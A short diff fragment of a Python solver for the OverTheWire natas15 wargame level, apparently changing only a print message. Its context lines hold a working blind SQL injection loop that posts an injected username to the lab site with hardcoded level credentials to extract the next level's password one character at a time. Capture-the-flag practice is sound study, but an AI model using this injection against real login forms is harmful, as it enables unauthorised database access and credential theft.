@@ -3,7 +3,7 @@ from requests.auth import HTTPBasicAuth
 
 try:
 	flag = ""
-	print("\nStart..\n")
+	print("\nStart...\n")
 	for pos in range(1,33):
 		for ch in range(32,  127):
 			resp = requests.post("http://natas15.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"), data={"username": "admin\" OR ASCII(SUBSTR((SELECT password FROM users WHERE username='natas16'),{},1))={}-- -".format(pos, ch)})
